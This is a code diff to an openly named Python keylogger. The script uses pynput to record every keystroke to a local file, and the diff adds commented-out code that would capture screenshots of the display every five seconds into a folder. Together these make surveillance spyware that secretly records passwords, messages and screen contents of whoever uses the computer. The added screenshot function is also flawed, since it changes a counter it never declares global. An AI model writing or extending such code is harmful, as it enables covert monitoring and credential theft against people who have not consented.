@@ -1,6 +1,12 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
+# import mss
+# import time
+
+# Set the screenshot directory
+screenshot_dir = "screenshots/"
+screenshot_count = 0
 
 # Clear the contents of keylogger.txt at the start
 with open("keylogger.txt", "w"):
@@ -60,6 +66,18 @@ def on_release(key):
     if key in modifier_keys:
         modifier_keys[key] = False
 
+# def take_screenshot():
+#     # Use a context manager to automatically clean up resources
+#     with mss.mss() as sct:
+#         while True:
+#             # Capture the screen
+#             screenshot = sct.shot(output=f"{screenshot_dir}screenshot_{screenshot_count}.png")
+#             print(f"Screenshot {screenshot_count} taken and saved as {screenshot}")
+
+#             screenshot_count += 1
+#             time.sleep(5)  # Wait for 5 seconds before taking the next screenshot
+
 # Listen for keyboard events and call on_press/on_release whenever a key is pressed/released
 with Listener(on_press=on_press, on_release=on_release) as listener:
+    # take_screenshot()
     listener.join()
